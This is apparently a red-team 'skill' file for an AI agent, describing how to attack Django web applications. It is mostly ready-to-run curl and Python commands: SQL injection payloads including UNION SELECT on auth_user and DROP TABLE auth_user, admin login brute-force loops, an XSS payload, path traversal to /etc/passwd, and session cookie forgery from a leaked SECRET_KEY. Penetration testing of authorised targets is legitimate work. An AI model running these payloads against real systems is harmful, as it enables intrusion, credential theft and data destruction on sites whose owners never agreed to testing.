---
name: hunt-django
description: Hunt Django-specific vulnerabilities: DRF permission gaps, ORM injection, and admin exploitation.
category: redteam
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [redteam, django, DRF, ORM, Python, admin, CSRF]
  category: redteam
  related_skills:
    - hunt-sqli
    - hunt-ssti
    - hunt-idor
    - hunt-csrf
---

# Django Security Hunting

Hunt Django-specific vulnerabilities focusing on Django REST Framework (DRF) permission class gaps, ORM raw query injection, template injection via `|safe` and `mark_safe`, and Django admin panel exploitation. Django's batteries-included approach creates unique attack surface: admin interface, ORM query building, DRF serializers, Channels WebSockets, and Celery task queues.

## When to Use

- Target uses Python/Django (indicated by `csrftoken` cookie, `/admin/` login, DRF browsable API, or `__debug__` toolbar).
- DRF API endpoints with class-based views and permission classes.
- Django Admin interface is reachable at `/admin/` or custom path.
- Celery task queues process user-supplied data.
- Django Channels WebSocket endpoints exist alongside REST API.

## Quick Detection

```bash
# Django fingerprinting
curl -skI "https://target.com/admin/login/" | grep -iE "csrftoken|sessionid|django"
curl -sk "https://target.com" | grep -oP 'csrftoken|__debug__|django'
```

## Procedure

### Phase 1 — DRF Permission Class Gaps

```bash
# DRF list vs retrieve vs custom @action — each may have different permissions
curl -sk "https://target.com/api/users/"          # list: may be restricted
curl -sk "https://target.com/api/users/1/"        # retrieve: may leak individual
curl -sk "https://target.com/api/users/me/"       # me: may work without auth

# Custom @action endpoints often miss permission checks
# Test common DRF action names
for action in "export" "import" "bulk" "search" "stats" "report" \
              "activate" "deactivate" "reset-password" "send-invite"; do
  curl -sk -X POST "https://target.com/api/users/$action/" \
    -w "%{http_code} — $action\n" -o /dev/null
done
```

### Phase 2 — ORM Raw Query Injection

```python
# Django raw() — direct SQL injection
requests.get("https://target.com/api/search/?q=' UNION SELECT username,password FROM auth_user--")

# Django extra() — where clause injection
requests.get("https://target.com/api/products/?category=1' OR '1'='1")

# RawSQL in annotations
requests.get("https://target.com/api/stats/?order=name'); DROP TABLE auth_user;--")

# Django cursor.execute() on user input
# Find via code review: cursor.execute(f"SELECT * FROM {table}")
```

### Phase 3 — Django Admin Exploitation

```bash
# Admin interface discovery
curl -sk "https://target.com/admin/"
curl -sk "https://target.com/django-admin/"
curl -sk "https://target.com/administrator/"

# Admin panel session cookie analysis
# If you obtain a session cookie, decode it
echo "SESSION_COOKIE" | python3 -c "
import base64,json,zlib,sys
cookie=sys.stdin.read().strip()
data=base64.b64decode(cookie.split('.')[0]+'==')
print(json.loads(zlib.decompress(data)))
"

# Django admin brute force (check for common credentials)
for pw in admin password django admin123 changeme; do
  curl -sk -X POST "https://target.com/admin/login/?next=/admin/" \
    -d "username=admin&password=$pw&csrfmiddlewaretoken=TOKEN" \
    -c /tmp/jar.txt -w "%{http_code} — $pw\n" -o /dev/null
done
```

### Phase 4 — Django Template Injection

```bash
# mark_safe and |safe filter on user input
# If a view returns mark_safe(user_input), inject HTML/JS
curl -sk "https://target.com/contact/?message=<script>alert(1)</script>"

# Template injection via user-controlled template names
curl -sk "https://target.com/preview/?template=../../etc/passwd"

# SECRET_KEY leakage → signed cookie forgery
# If SECRET_KEY is leaked (env file, debug page, error)
python3 -c "
from django.core.signing import TimestampSigner
signer = TimestampSigner(key='LEAKED_SECRET_KEY')
print(signer.sign('admin'))
"
```

### Phase 5 — Channels WebSocket Auth Parity

```bash
# Django Channels WebSocket — may not enforce same auth as REST
# Test WS connection with and without session cookie
wscat -c "wss://target.com/ws/chat/" -H "Cookie: sessionid=INVALID"

# Async consumers without @database_sync_to_async may have race conditions
# Test parallel WS messages to trigger race
```

## Pitfalls

- **DRF `AllowAny` ≠ misconfiguration.** Verify the endpoint is supposed to be public before reporting.
- **Django admin brute force is heavily logged.** Use with caution on production targets.
- **Template injection requires a sink.** Django's template engine auto-escapes by default — `|safe` or `mark_safe` must be explicitly used.
- **SECRET_KEY must be actually leaked.** Guessing or brute-forcing SECRET_KEY is computationally infeasible.

## Verification

1. DRF endpoint without `IsAuthenticated` returns data that should be restricted.
2. ORM raw query injection produces a database error or data exfiltration.
3. Django admin session cookie decoded successfully reveals user ID and session data.
4. Template injection executes JavaScript or reads server files.

## Related Skills

- **`hunt-sqli`** — Django ORM raw query injection chains to full SQL injection.
- **`hunt-ssti`** — Django template injection via user-controlled template names.
- **`hunt-idor`** — DRF permission gaps leading to object-level access.
